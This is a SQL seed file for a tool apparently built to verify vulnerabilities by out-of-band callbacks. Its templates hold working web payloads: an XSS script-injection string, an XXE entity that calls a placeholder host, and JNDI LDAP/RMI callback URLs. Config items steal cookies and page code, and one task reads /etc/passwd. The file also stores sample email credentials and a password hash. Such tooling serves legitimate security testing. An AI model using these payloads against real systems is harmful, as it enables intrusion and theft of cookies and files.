INSERT INTO antenna.config (id, name, type, value, create_time, update_time) VALUES (7, 'JNDI_PORT', 1, '2345', '2022-01-13 14:25:56', '2022-01-13 14:25:58');
INSERT INTO antenna.config (id, name, type, value, create_time, update_time) VALUES (8, 'OPEN_REGISTER', 0, '0', '2022-01-13 14:28:05', '2022-01-13 14:28:09');
INSERT INTO antenna.config (id, name, type, value, create_time, update_time) VALUES (9, 'INVITE_TO_REGISTER', 0, '0', '2022-01-13 14:28:07', '2022-01-13 14:28:11');
INSERT INTO antenna.config (id, name, type, value, create_time, update_time) VALUES (10, 'OPEN_EMAIL', 0, '1', '2022-01-13 14:29:14', '2022-01-13 14:29:16');
INSERT INTO antenna.config (id, name, type, value, create_time, update_time) VALUES (11, 'EMAIL_HOST', 0, 'smtp.qq.com', '2022-01-13 14:31:32', '2022-01-13 14:31:34');
INSERT INTO antenna.config (id, name, type, value, create_time, update_time) VALUES (12, 'EMAIL_PORT', 0, '465', '2022-01-13 14:32:13', '2022-01-13 14:32:15');
INSERT INTO antenna.config (id, name, type, value, create_time, update_time) VALUES (13, 'EMAIL_HOST_USER', 0, '58@qq.com', '2022-01-13 14:33:58', '2022-01-13 14:34:00');
INSERT INTO antenna.config (id, name, type, value, create_time, update_time) VALUES (14, 'EMAIL_HOST_PASSWORD', 0, '123456789', '2022-01-13 14:34:41', '2022-01-13 14:34:43');
INSERT INTO antenna.auth_user (id, password, last_login, is_superuser, username, first_name, last_name, email, is_staff, is_active, date_joined) VALUES (1, 'pbkdf2_sha256$260000$xGOtY8UIDmVOhMxxf97MrC$zyrByum510+7GTa/lr1WaVLNh+cbFzJuuxnM81OTYcw=', null, 0, 'antenna@58.com', '', '', 'antenna@58.com', 1, 1, '2022-08-09 19:34:15.075340');
INSERT INTO antenna.task (id, name, status, create_time, update_time, callback_url, callback_url_headers, is_tmp, show_dashboard, user_id) VALUES (1, '初始任务', 1, '2022-08-17 14:27:50.425571', '2022-08-17 14:27:50.425608', null, '{}', 1, 1, 1);
INSERT INTO antenna.template (id, name, title, `desc`, desc_url, author, type, choice_type, file_name, create_time, update_time, is_private, user_id, payload) VALUES (1, 'DNS', 'DNS协议监听组件', '', '', 'bios000', 1, 0, 'dnslog.py', '2022-08-10 13:10:51.258765', '2022-08-19 17:59:38.708233', 1, 1, '{key}.{domain}');
INSERT INTO antenna.template (id, name, title, `desc`, desc_url, author, type, choice_type, file_name, create_time, update_time, is_private, user_id, payload) VALUES (2, 'LDAP', 'ldap协议监听组件', '', '', 'bios000', 1, 0, 'jndi.py', '2022-08-10 13:10:51.362671', '2022-08-19 17:59:38.968173', 1, 1, 'ldap://{domain}:{jndi_port}/{key}');
INSERT INTO antenna.template (id, name, title, `desc`, desc_url, author, type, choice_type, file_name, create_time, update_time, is_private, user_id, payload) VALUES (3, 'RMI', 'rmi协议监听组件', '', '', 'bios000', 1, 0, 'jndi.py', '2022-08-10 13:10:51.464547', '2022-08-19 17:59:39.229325', 1, 1, 'rmi://{domain}:{jndi_port}/{key}');
INSERT INTO antenna.template (id, name, title, `desc`, desc_url, author, type, choice_type, file_name, create_time, update_time, is_private, user_id, payload) VALUES (4, 'XSS', 'XSS漏洞利用组件', '', '', 'bios000', 0, 1, 'xss.py', '2022-08-10 13:10:51.574223', '2022-08-19 17:59:39.489568', 1, 1, '</tExtArEa>''"><sCRiPt sRC=//{domain}/{key}></sCrIpT>');
INSERT INTO antenna.template (id, name, title, `desc`, desc_url, author, type, choice_type, file_name, create_time, update_time, is_private, user_id, payload) VALUES (5, 'HTTP_CUSTOM', '自定义HTTP利用组件', '', '', 'bios000', 0, 0, 'http_custom.py', '2022-08-10 13:10:51.712382', '2022-08-19 17:59:40.142226', 1, 1, 'http://{domain}/{key}');
INSERT INTO antenna.template (id, name, title, `desc`, desc_url, author, type, choice_type, file_name, create_time, update_time, is_private, user_id, payload) VALUES (6, 'XXE', 'XXE漏洞利用组件', '', '', 'bios000', 0, 1, 'xxe.py', '2022-08-10 13:10:51.856694', '2022-08-19 17:59:39.879768', 1, 1, '<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE ANY [
<!ENTITY % xd SYSTEM "http://{domain}/{key}">
    %xd;
]>
<root>&bbbb;</root>');
INSERT INTO antenna.template (id, name, title, `desc`, desc_url, author, type, choice_type, file_name, create_time, update_time, is_private, user_id, payload) VALUES (7, 'HTTP', 'HTTP协议监听组件', '', '', 'bios000', 1, 0, 'http.py', '2022-08-10 22:39:44.000586', '2022-08-19 17:59:40.668357', 1, 1, 'http://{key}.{domain}/');
INSERT INTO antenna.template_config_item (id, name, config, template_id) VALUES (1, 'dns_log', '[]', 1);
INSERT INTO antenna.template_config_item (id, name, config, template_id) VALUES (2, 'ldap_log', '[]', 2);
INSERT INTO antenna.template_config_item (id, name, config, template_id) VALUES (3, 'rmi_log', '[]', 3);
INSERT INTO antenna.template_config_item (id, name, config, template_id) VALUES (4, 'xss_get_cookie', '[]', 4);
INSERT INTO antenna.template_config_item (id, name, config, template_id) VALUES (5, 'xss_get_page_code', '[]', 4);
INSERT INTO antenna.template_config_item (id, name, config, template_id) VALUES (6, 'custom_http_html', '["value", "headers"]', 5);
INSERT INTO antenna.template_config_item (id, name, config, template_id) VALUES (7, 'custom_http_location', '["url"]', 5);
INSERT INTO antenna.template_config_item (id, name, config, template_id) VALUES (9, 'http_log', '[]', 7);
INSERT INTO antenna.template_config_item (id, name, config, template_id) VALUES (10, 'jsonp_html', '["url"]', 5);
INSERT INTO antenna.template_config_item (id, name, config, template_id) VALUES (11, 'xxe_read_file', '["path"]', 6);
INSERT INTO antenna.task_config (id, `key`, task_id) VALUES (1, 'KiG4', 1);
INSERT INTO antenna.task_config (id, `key`, task_id) VALUES (2, 'T9eF', 1);
INSERT INTO antenna.task_config (id, `key`, task_id) VALUES (3, 'x1Yh', 1);
INSERT INTO antenna.task_config (id, `key`, task_id) VALUES (4, 'LqhG', 1);
INSERT INTO antenna.task_config (id, `key`, task_id) VALUES (5, 'ya4I', 1);
INSERT INTO antenna.task_config (id, `key`, task_id) VALUES (6, 'QqHg', 1);
INSERT INTO antenna.task_config_item (id, value, task_id, task_config_id, template_id, template_config_item_id) VALUES (1, '{}', 1, 1, 1, 1);
INSERT INTO antenna.task_config_item (id, value, task_id, task_config_id, template_id, template_config_item_id) VALUES (2, '{}', 1, 2, 7, 9);
INSERT INTO antenna.task_config_item (id, value, task_id, task_config_id, template_id, template_config_item_id) VALUES (3, '{}', 1, 3, 2, 2);
INSERT INTO antenna.task_config_item (id, value, task_id, task_config_id, template_id, template_config_item_id) VALUES (4, '{}', 1, 4, 3, 3);
INSERT INTO antenna.task_config_item (id, value, task_id, task_config_id, template_id, template_config_item_id) VALUES (5, '{}', 1, 5, 4, 4);
INSERT INTO antenna.task_config_item (id, value, task_id, task_config_id, template_id, template_config_item_id) VALUES (6, '{}', 1, 5, 5, 4);
INSERT INTO antenna.task_config_item (id, value, task_id, task_config_id, template_id, template_config_item_id) VALUES (7, '{"path": "/etc/passwd"}', 1, 6, 6, 11);